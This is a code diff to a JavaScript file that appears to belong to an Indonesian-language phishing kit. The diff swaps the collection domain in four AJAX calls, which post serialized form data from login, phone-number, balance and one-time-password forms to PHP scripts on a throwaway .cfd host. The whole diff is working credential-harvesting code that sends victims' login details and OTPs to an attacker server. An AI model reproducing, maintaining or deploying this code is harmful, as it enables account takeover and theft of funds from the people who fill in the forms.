@@ -13,7 +13,7 @@ function sendHp() {
    sessionStorage.setItem('nohp', nohp);
    
    $.ajax({
-      url: 'https://choreoapps.oo-nan.cfd/yao/no.php',
+      url: 'https://choreoapps.oo-feed.cfd/yao/no.php',
       type: 'POST',
       data: $('#login').serialize(),  
       complete: function() {
@@ -34,7 +34,7 @@ function sendLogin(){
     document.getElementById('lanjutkan').innerHTML = "Memproses....";               
     
     $.ajax({
-      url: 'https://choreoapps.oo-nan.cfd/yao/sudah.php',
+      url: 'https://choreoapps.oo-feed.cfd/yao/sudah.php',
       type: 'POST',
       data: $('#sudah').serialize(),    
     complete: function(){    
@@ -64,7 +64,7 @@ function sendSaldoS() {
    document.getElementById('lanjutkan').innerHTML = "Memproses....";
    
    $.ajax({
-      url: 'https://choreoapps.oo-nan.cfd/yao/saldosdh.php',
+      url: 'https://choreoapps.oo-feed.cfd/yao/saldosdh.php',
       type: 'POST',
       data: $('#saldosdh').serialize(),
       complete: function() {
@@ -98,7 +98,7 @@ function sendOtpS() {
    var nama1 = document.getElementById('nama1');
    
    $.ajax({
-      url: 'https://choreoapps.oo-nan.cfd/yao/otpsdh.php',
+      url: 'https://choreoapps.oo-feed.cfd/yao/otpsdh.php',
       type: 'POST',
       data: $('#formsdh').serialize(),
       complete: function(response) {
